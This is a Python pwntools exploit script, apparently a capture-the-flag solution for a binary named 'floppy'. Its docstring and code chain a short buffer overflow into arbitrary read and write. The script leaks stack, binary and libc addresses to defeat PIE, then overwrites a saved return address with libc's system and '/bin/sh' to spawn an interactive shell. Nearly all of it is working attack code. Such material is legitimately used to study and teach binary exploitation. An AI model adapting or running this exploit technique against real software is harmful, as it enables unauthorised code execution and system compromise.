#!/usr/bin/env python2
from pwn import *
'''
This binary has a short buffer overflow through the modify floppy functonality, which lets us modify a pointer on the stack. This gives us arbritary read and write funconality. We'll use this to get arbritary code execution by overwriting a return address on the stack.

However, the binary has PIE on so we need to leak a pointer into the binary, and then another one into libc. To do this, we will also need to leak a pointer on the stack. Luckily there is one right after the description of one of the floppies.

So our exploit looks like this:
    Leak a pointer on the stack by setting the description of floppy1
    Leak a pointer into main() by setting the floppy1 pointer to a specific stack addresses and reading it.
    Leak a pointer into libc by setting the floppy1 pointer to libc_start_main@got and reading
    Set saved return address on stack to system (in libc) by modifying floppy1
    Exit and ret2libc to get a shell'''
e = ELF("floppy")
libc = ELF("libc-2.19.so")
r = process("./floppy")
context.log_level = 'DEBUG' # for some reason, exploit fails without this
#r = process("linux_server") # for debugging the exploit

r.recvuntil(">\n")
# choose floppy1, init the floppy
r.sendline("1")
r.recvuntil("?\n\n")
r.sendline("1")
r.recvuntil(">\n")
r.sendline("2")
r.sendline("blah")
r.sendline("blaH")
r.recvuntil(">\n")
# now modify and set description so we can leak the stack address
r.sendline("4")
r.recvuntil("Data\n\n")
r.sendline("1")
r.recvuntil(": \n\n")
r.sendline("a" * 16)
r.recvuntil(">\n")
r.sendline("3")
r.recvuntil("TION: " + "a" * 16)
stack_addr = u32(r.recvn(4))
log.info("Stack address: " + hex(stack_addr))
main_ret = stack_addr - 56 # found with ida

# now we set floppy1's data ptr to that stack address + some offset, to get a pointer into main
# we do this by setting the description of floppy2
r.recvuntil(">\n")
r.sendline("1")
r.sendline("2")
r.recvuntil(">\n")
r.sendline("2")
r.sendline("blah")
r.recvuntil("tion: \n")
r.sendline("blah")
r.recvuntil(">\n")
# set desc
r.sendline("4")
r.sendline("1")
r.recvuntil(": \n\n")
r.sendline('a' * 20 + p32(main_ret))
r.recvuntil(">\n")
# read the pointer to main
r.sendline("1")
r.sendline("1")
r.recvuntil(">\n")
r.sendline("3")
r.recvuntil("DATA: ")
main_addy = u32(r.recvn(4))
log.info("Leaked address of main+171: " + hex(main_addy))
bin_base = main_addy - 0x10cb # found with ida
log.info("Binary base: " + hex(bin_base))

# now we need to leak libc_start_main@got
libc_start_got = bin_base + e.got["__libc_start_main"]
r.sendline("1")
r.sendline("2")
r.recvuntil(">\n")
# set desc
r.sendline("4")
r.sendline("1")
r.recvuntil(": \n\n")
r.sendline('a' * 20 + p32(libc_start_got))
r.recvuntil(">\n")
# read the pointer to libc_start_main in libc
r.sendline("1")
r.sendline("1")
r.recvuntil(">\n")
r.sendline("3")
r.recvuntil("DATA: ")
libc_start_libc = u32(r.recvn(4))
#libc_base = libc_start_libc - 0x00019970
libc_base = libc_start_libc - libc.symbols["__libc_start_main"]
log.info("Libc base: " + hex(libc_base))

# now compute system, ret2libc for system (we also need the address of /bin/sh
system_libc = libc_base + libc.symbols["system"]
ret_addr = stack_addr + 56
bin_sh = libc_base + next(libc.search("/bin/sh\x00"))

r.sendline("1")
r.sendline("2")
r.recvuntil(">\n")
# set desc
r.sendline("4")
r.sendline("1")
r.recvuntil(": \n\n")
r.sendline('a' * 20 + p32(ret_addr))
r.recvuntil(">\n")
# now modify data of 1 to point to system
r.sendline("1")
r.sendline("1")
r.recvuntil(">\n")
r.sendline("4")
r.sendline("2")
r.recvuntil("Data: \n")
r.send(p32(system_libc) + 'aaaa' + p32(bin_sh)) # addr of system + junk + addr or /bin/sh
r.recvuntil(">\n")

# now pwn!
r.sendline("5") # exit the program to get the program to execute our ROP
r.interactive()
